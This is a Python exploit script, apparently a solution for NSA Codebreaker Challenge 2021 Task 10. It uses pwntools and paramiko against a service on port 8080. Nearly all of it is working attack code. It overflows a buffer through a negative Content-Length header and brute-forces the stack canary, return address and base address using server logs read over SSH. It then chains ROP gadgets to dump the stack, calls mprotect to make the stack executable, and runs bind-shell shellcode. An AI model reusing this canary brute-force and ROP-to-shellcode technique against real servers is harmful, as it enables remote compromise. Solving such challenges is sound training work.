"""
Exploit script for NSA Codebreaker Challenge 2021 Task 10

This ended up being quite linear, and could desperately use some refactoring/optimization.  It's dirty - but gets the
job done!
"""

from pwn import *
import time
import paramiko
import binascii

real = False

if __name__ == '__main__':
    real_server_ip = ""
    path_to_server_log = ""
    path_to_data_log = ""
    path_to_id_rsa = ""
    test_user = "test"
    test_password = "test"

    context.update(arch='amd64', os='linux')
    shellcode = asm(shellcraft.bindsh(10041, "ipv4"))

    if real:
        server = real_server_ip
        username = "lpuser"
        key = paramiko.RSAKey.from_private_key_file(path_to_id_rsa)
        server_log = "/home/psuser/ps_server.log"
        data_log = "/home/psuser/ps_data.log"
    else:
        server = "localhost"
        username = test_user
        password = test_password
        server_log = path_to_server_log
        data_log = path_to_data_log

    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    if real:
        ssh.connect(server, username=username, pkey=key)
    else:
        ssh.connect(server, username=username, password=password)

    # Bruteforce the canary
    canary = b'\x00'

    while len(canary) != 8:
        failed = True
        for i in range(256):
            payload1 = "Content-Length: -1\r\n\r\n{}".format('\x00' * 0xf00).encode()
            payload2 = b'\x00' * 264 + canary + bytes([i])

            p = remote(server, 8080)

            p.send(payload1)
            time.sleep(0.15)

            p.send(payload2)
            p.recvuntil(b"\r\n\r\n").decode()
            r = p.recvall()

            p.close()

            # Check the result
            time.sleep(0.15)
            ssh_stdin, ssh_stdout, ssh_stderr = ssh.exec_command("tail -n 1 {}".format(server_log))
            result = ssh_stdout.readline()

            if "status 0" in result:
                canary += bytes([i])
                print(binascii.hexlify(canary).decode())
                failed = False
                break

        if failed:
            print("oh no!")
            canary = canary[:-1]
    print("canary: {}".format(hex(u64(canary))))

    # Bruteforce a good return value
    ret = b''

    while len(ret) != 8:
        failed = True
        for i in range(256):
            payload = "Content-Length: -1\r\n\r\n{}".format('\x00' * 0xf00).encode()
            payload2 = (b'\x00' * 264) + canary + (b'\x00' * 24) + ret + bytes([i])

            p = remote(server, 8080)
            p.send(payload1)
            time.sleep(0.15)

            p.send(payload2)
            p.recvuntil(b"\r\n\r\n").decode()
            r = p.recvall()

            p.close()

            # Check the result
            time.sleep(0.15)
            ssh_stdin, ssh_stdout, ssh_stderr = ssh.exec_command("tail -n 1 {}".format(server_log))
            result = ssh_stdout.readline()

            if "status 0" in result:
                ret += bytes([i])
                print(binascii.hexlify(ret).decode())
                failed = False
                break

        if failed:
            print("oh no!")
            ret = ret[:-1]

    print("good return: {}".format(hex(u64(ret))))

    # Bruteforce the base address
    base = hex(u64(ret))[2:9]

    POP_RAX_RET = POP_RDI_RET = POP_RDX_RET = POP_RSI_RET = SYSCALL_RET = JMP_RSP = MOV_RBX_RSP_MOV_RSI_RBX_SYSCALL = newbase = None
    for i in range(0xff):
        newbase = int((base + ("%02x" % i) + "000"), 16)

        # Calculate ROP gadget addresses
        POP_RAX_RET = newbase + 0x000000000000877f
        POP_RDI_RET = newbase + 0x0000000000008876
        POP_RDX_RET = newbase + 0x000000000001cca2
        POP_RSI_RET = newbase + 0x000000000001a533
        SYSCALL_RET = newbase + 0x0000000000052a25
        MOV_RBX_RSP_MOV_RSI_RBX_SYSCALL = newbase + 0x000000000008f4fc
        JMP_RSP = newbase + 0x000000000007ac3d

        payload = "Content-Length: 4096\r\n\r\n{}".format('\x00' * 0xf00).encode()
        payload2 = cyclic(264) + canary + (b'\x00' * 24)

        # Load 60 into RAX for exit syscall
        payload2 += p64(POP_RAX_RET)
        payload2 += p64(60)

        # Load 0 into RDI for exit code of 0
        payload2 += p64(POP_RDI_RET)
        payload2 += p64(0)

        # Execute the syscall
        payload2 += p64(SYSCALL_RET)
        payload2 += ret

        p = remote(server, 8080)
        p.send(payload1)
        time.sleep(0.1)

        p.send(payload2)
        p.recvuntil(b"\r\n\r\n").decode()
        r = p.recvall()

        p.close()

        # Check the result
        ssh_stdin, ssh_stdout, ssh_stderr = ssh.exec_command("tail -n 1 {}".format(server_log))
        result = ssh_stdout.readline()
        if "status 0" in result:
            print("base: {}".format(hex(newbase)))
            break

    # Write 4095 bytes of the stack into ps_data.log

    payload = "Content-Length: 4096\r\n\r\n{}".format('\x00' * 0xf00).encode()
    payload2 = cyclic(264) + canary + (b'\x00' * 24)

    # Load 1 into RAX for write syscall
    payload2 += p64(POP_RAX_RET)
    payload2 += p64(1)

    # Write to file descriptor 4 (ps_data.log)
    payload2 += p64(POP_RDI_RET)
    payload2 += p64(4)

    # Write 4095 bytes
    payload2 += p64(POP_RDX_RET)
    payload2 += p64(0xfff)

    # Load a pointer to the stack into RSI as the source to write from, then execute the syscall
    payload2 += p64(MOV_RBX_RSP_MOV_RSI_RBX_SYSCALL)

    p = remote(server, 8080)
    p.send(payload1)
    time.sleep(0.1)

    p.send(payload2)
    p.recvuntil(b"\r\n\r\n").decode()
    r = p.recvall()

    p.close()

    # Print the output
    time.sleep(1)
    ssh_stdin, ssh_stdout, ssh_stderr = ssh.exec_command("hexdump -C {}".format(data_log))
    print(ssh_stdout.read().decode()[-4096:])
    print()

    # After observing the output, manually enter what appears to be a stack address
    # Don't forget to subtract!  eg: if you see 0x7ffd12345678, enter 0x7ffd12340000 instead!
    stack_addr = int(input("> "), 16)

    print("stack: {}".format(hex(stack_addr)))

    # Make the stack executable, and execute our shellcode

    payload = "Content-Length: 4096\r\n\r\n{}".format('\x00' * 0xf00).encode()
    payload2 = cyclic(264) + canary + (b'\x00' * 24)

    # Load 10 into RAX for mprotect syscall
    payload2 += p64(POP_RAX_RET)
    payload2 += p64(10)

    # We will be calling mprotect on a stack location we identified from the stack dump
    payload2 += p64(POP_RDI_RET)
    payload2 += p64(stack_addr)

    # modify a large region (0xfffff bytes!)
    payload2 += p64(POP_RSI_RET)
    payload2 += p64(0xfffff)

    # make the region RWX
    payload2 += p64(POP_RDX_RET)
    payload2 += p64(7)

    # Execute the syscall
    payload2 += p64(SYSCALL_RET)

    # Jump to the stack, which contains our shellcode
    payload2 += p64(JMP_RSP)
    payload2 += shellcode

    payload2 += ret

    p = remote(server, 8080)
    p.send(payload1)
    time.sleep(0.1)

    p.send(payload2)
    p.recvuntil(b"\r\n\r\n").decode()
    r = p.recvall()

    p.close()

    print("canary: {}\nret: {}\nbase: {}\nstack: {}".format(hex(canary), hex(ret), hex(newbase), hex(stack_addr)))

    ssh.close()
